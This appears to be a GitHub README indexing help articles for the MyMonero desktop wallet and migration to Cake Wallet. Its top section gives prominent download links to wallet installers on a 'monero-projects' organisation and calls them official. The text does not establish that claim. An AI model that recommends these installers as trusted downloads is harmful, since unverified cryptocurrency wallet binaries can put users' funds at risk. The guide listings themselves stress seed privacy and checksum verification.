<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-hub.png" alt="MyMonero hub banner" width="100%"></p>

<h1 align="center">MyMonero Guides</h1>
<p align="center">How-to articles for the MyMonero desktop wallet and migration to Cake Wallet</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

Welcome to the MyMonero help library. Every article answers one real question from people who still use the MyMonero desktop wallet or are moving their XMR to Cake Wallet. The final desktop release is v1.3.3; it still opens wallets and sends XMR, but it receives no further updates. Pick the topic that matches what you see on your screen.

## How to use this library

Start with the section that describes your situation. If you want to keep using the old app, the Desktop Wallet section covers installing the final release on Windows, macOS and Linux, sending and receiving XMR, and reading a balance that looks wrong. If you would rather move to a maintained wallet, the Migrate section explains how a MyMonero seed is restored in Cake Wallet, how the 13 word and 25 word seeds differ, what a restore height is and when sweeping funds to a fresh wallet makes more sense than restoring. The Seeds and Keys section helps you locate your recovery words, understand view and spend keys and deal with a forgotten password. Troubleshooting walks through sync problems, error 523 and an app that will not open. The Safety section collects the facts about the shutdown and the warning signs of the scams that follow it.

Each article starts with a short answer, then lists the symptoms, the cause, a numbered fix and what to try if the fix did not work. Every article ends with the same download block, so you can always reach the official installers and the checksums published on the release page. Before you install any file, compare its SHA-256 with the value on the release page; if a single character differs, delete the file and download it again.

> [!WARNING]
> No guide here will ever ask for your seed or private keys. Anyone who does is attempting theft.

---

## Migrate

Moving your MyMonero wallet to Cake Wallet, choosing the right seed path and deciding between restoring and sweeping.

| Guide | What it covers |
|---|---|
| [MyMonero to Cake Wallet Migration](./how-to/mymonero-to-cake-wallet-migration.md) | How to move your wallet access carefully and keep control of your XMR. |
| [Restore a MyMonero 13-Word Seed](./how-to/mymonero-13-word-seed-restore.md) | Recognize the legacy seed format and restore it without exposing your recovery phrase. |
| [Migrate a MyMonero 25-Word Seed](./how-to/mymonero-25-word-seed-migration.md) | Restore a standard Monero phrase in another supported wallet and scan from a suitable height. |
| [MyMonero Restore Height Explained](./how-to/mymonero-restore-height-explained.md) | Understand the scan start point and choose a sensible value when restoring a wallet. |
| [Sweep MyMonero Funds to a New Wallet](./how-to/mymonero-sweep-funds-new-wallet.md) | Understand what sweeping does and prepare carefully before sending your full balance. |
| [MyMonero Alternative Wallet](./how-to/mymonero-alternative-wallet.md) | Your practical options after MyMonero hosted access stopped. |
| [MyMonero vs Cake Wallet Comparison](./how-to/mymonero-vs-cake-wallet-comparison.md) | Compare the remaining practical paths by platform, maintenance, and migration behavior. |
| [MyMonero Migration Checklist](./how-to/mymonero-migration-checklist.md) | A calm sequence for preparing a wallet restore or a separate funds transfer. |

---

## Desktop Wallet

Everyday use of the MyMonero desktop app: installing, sending, receiving and understanding your balance.

| Guide | What it covers |
|---|---|
| [How to Use MyMonero Desktop](./how-to/how-to-use-mymonero-desktop.md) | What the final desktop app can still do, and how to use it with care. |
| [Send XMR with MyMonero](./how-to/mymonero-send-xmr.md) | Verify the recipient, amount, and fee before confirming a transaction. |
| [Withdraw XMR From MyMonero to an Exchange](./how-to/mymonero-withdraw-to-exchange.md) | How to send Monero safely from the desktop wallet to an exchange deposit address. |
| [Restore a MyMonero Wallet](./how-to/restore-mymonero-wallet.md) | Recover access by restoring a compatible seed in MyMonero desktop or Cake Wallet. |
| [MyMonero Balance Shows Zero](./how-to/mymonero-balance-shows-zero.md) | Check wallet selection, scanning, restore height, and connection before concluding funds are missing. |
| [MyMonero Transaction Not Showing](./how-to/mymonero-transaction-not-showing.md) | Troubleshoot missing incoming or outgoing activity without exposing wallet secrets. |
| [MyMonero Locked or Pending Balance](./how-to/mymonero-locked-pending-balance.md) | Understand why total funds and the amount available to send may differ. |
| [MyMonero Spendable Balance Is Low](./how-to/mymonero-spendable-balance-low.md) | Find out why the amount available to send can be less than your total wallet balance. |
| [MyMonero Import Fee Explained](./how-to/mymonero-import-fee-explained.md) | What the historical wallet import fee meant, and how to approach a prompt today. |
| [Receive XMR With a MyMonero Address](./how-to/mymonero-receive-xmr-address.md) | Find and share a receiving address safely, and confirm the incoming transaction. |
| [Install MyMonero on Windows](./how-to/install-mymonero-windows.md) | Get the final desktop release from the official project page and check the file before opening it. |
| [Install MyMonero on macOS](./how-to/install-mymonero-macos.md) | Download the final desktop release from GitHub, verify its SHA-256 value, and open it safely. |
| [Install MyMonero on Linux](./how-to/install-mymonero-linux.md) | Get the final Linux desktop release and open it with care. |
| [Verify a MyMonero Download with SHA-256](./how-to/verify-mymonero-download-sha256.md) | Compare the file you downloaded with the release page before opening it. |

---

## Seeds and Keys

Your recovery words, private keys and password, and what to do when one of them causes trouble.

| Guide | What it covers |
|---|---|
| [Find Your MyMonero Seed](./how-to/find-mymonero-seed.md) | Locate the recovery phrase you saved when setting up your wallet. |
| [MyMonero Seed: 13 vs 25 Words](./how-to/mymonero-seed-13-vs-25-words.md) | Understand which recovery phrase format you have before restoring. |
| [MyMonero Seed Not Accepted](./how-to/mymonero-seed-not-accepted.md) | Check the format and your own backup without exposing recovery words. |
| [MyMonero Lost Seed Word](./how-to/mymonero-lost-seed-word.md) | Protect what remains of your backup and avoid risky guesses. |
| [MyMonero Private View and Spend Keys](./how-to/mymonero-private-view-spend-keys.md) | Learn what these wallet credentials mean and how to keep them private. |
| [Forgot MyMonero Password](./how-to/mymonero-forgot-password.md) | Separate an app password problem from wallet recovery. |
| [Back Up Your MyMonero Seed Safely](./how-to/mymonero-backup-seed-safely.md) | Keep recovery words private, legible, and available when you need them. |

---

## Troubleshooting

Sync problems, error messages and an app that will not start.

| Guide | What it covers |
|---|---|
| [MyMonero Not Syncing](./how-to/mymonero-not-syncing.md) | Tell a connection problem from a wallet scan that needs more time. |
| [MyMonero Error 523: What It Means and What to Try](./how-to/mymonero-error-523.md) | Understand a server-connection error and check your wallet without risking recovery information. |
| [MyMonero Error Codes List and Safe Troubleshooting](./how-to/mymonero-error-codes-list.md) | A cautious guide to interpreting wallet errors without treating every message as a lost-funds warning. |
| [MyMonero App Not Opening: Safe Checks to Try](./how-to/mymonero-app-not-opening.md) | Work through launch problems carefully while keeping recovery words and wallet data private. |
| [MyMonero App Crashes on Start: What to Check](./how-to/mymonero-app-crashes-on-start.md) | Separate an application startup crash from wallet recovery, connection, and hosted-login issues. |
| [macOS Says MyMonero Cannot Be Opened: Safe Steps](./how-to/mymonero-macos-cannot-be-opened.md) | Use the specific right-click Open guidance and avoid weakening security for an untrusted download. |

---

## Safety

Facts about the shutdown, safety questions and the scams that target MyMonero users.

| Guide | What it covers |
|---|---|
| [MyMonero Shutdown Facts: What Is and Is Not Known](./how-to/mymonero-shutdown-facts.md) | Separate confirmed product status from uncertain dates and details, and plan next steps without panic. |
| [Is MyMonero Safe? Practical Considerations](./how-to/is-mymonero-safe.md) | Understand the desktop app’s maintenance status, protect your seed, and assess choices without absolute promises. |
| [MyMonero Migration Scams: Warning Signs and Safer Choices](./how-to/mymonero-migration-scams.md) | Spot pressure tactics, protect recovery words, and plan any wallet transition at your own pace. |
| [MyMonero Fake Download Warning: Verify Before Installing](./how-to/mymonero-fake-download-warning.md) | Find the final desktop packages safely, check file integrity, and avoid lookalike installers. |
| [MyMonero FAQ: Desktop Status, Recovery, and Safety](./how-to/mymonero-faq.md) | Clear answers to common questions about the final desktop release, wallet access, seeds, and migration. |

---

## About this library

The articles live in the `how-to` folder and are written as general guidance for the MyMonero desktop wallet. The app itself is in [mymonero-desktop-wallet](https://github.com/monero-projects/mymonero-desktop-wallet), and the downloads and checksums are on the [v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## License

Text in this repository is licensed under CC-BY-4.0. See LICENSE.
